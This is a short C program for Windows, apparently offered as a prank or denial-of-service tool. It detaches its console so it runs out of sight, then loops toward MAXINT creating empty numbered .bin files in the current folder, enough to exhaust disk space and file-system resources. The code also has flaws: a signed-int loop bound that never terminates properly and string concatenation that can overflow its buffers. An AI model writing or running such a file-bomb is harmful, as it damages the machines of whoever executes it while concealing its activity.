
#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif
#include <Windows.h>
#include <stdio.h>
#include <string.h>
#define MAXINT 4294967295
int main()
{
	FreeConsole();
	int a, b ,c;
	char name[11], name2[22],name3[33];
	Sleep(10);
	for (a = 1; a<MAXINT; a++) {
		sprintf(name, "%d", a);
		strcat(name, ".bin");
		fclose(fopen(name, "wb"));
	}
	for (b = 1; b<MAXINT; b++) {
		sprintf(name2, "%d", b);
		strcat(name2,name);
		fclose(fopen(name2, "wb"));
	}
	for (c = 1; c<MAXINT; c++) {
		sprintf(name3, "%d", c);
		strcat(name3, name2);
		fclose(fopen(name3, "wb"));
	}
}
